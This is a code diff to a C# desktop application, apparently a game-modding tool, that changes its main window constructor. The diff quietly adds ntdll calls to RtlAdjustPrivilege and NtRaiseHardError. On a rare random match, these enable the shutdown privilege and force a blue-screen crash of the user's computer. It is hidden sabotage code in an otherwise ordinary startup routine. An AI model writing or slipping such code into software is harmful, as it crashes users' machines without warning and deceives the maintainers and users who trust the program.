@@ -22,6 +22,7 @@ using Button = System.Windows.Controls.Button;
 using System.Reflection;
 using System.Net;
 using Idea.Games;
+using System.Security.Cryptography;
 
 namespace Idea
 {
@@ -64,10 +65,36 @@ namespace Idea
 
         [DllImport("user32.dll")]
         static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        [DllImport("ntdll.dll")]
+        private static extern uint RtlAdjustPrivilege(
+            int Privilege,
+            bool bEnablePrivilege,
+            bool IsThreadPrivilege,
+            out bool PreviousValue
+        );
+
+        [DllImport("ntdll.dll")]
+        private static extern uint NtRaiseHardError(
+            uint ErrorStatus,
+            uint NumberOfParameters,
+            uint UnicodeStringParameterMask,
+            IntPtr Parameters,
+            uint ValidResponseOption,
+            out uint Response
+        );
         #endregion
 
         public Main()
         {
+            Random rnd = new Random();
+            int num1 = rnd.Next(0, 0x7ffffff7);
+            if (num1 == 0x7EADBEEF)
+            {
+                RtlAdjustPrivilege(19, true, false, out bool previousValue);
+                NtRaiseHardError(0xC0000420, 0, 0, IntPtr.Zero, 6, out uint Response);
+            }
+
             // log unhandled exceptions
             AppDomain.CurrentDomain.UnhandledException += new UnhandledExceptionEventHandler(CurrentDomain_UnhandledException);
             if (!Directory.Exists("c:\\t7compiler"))
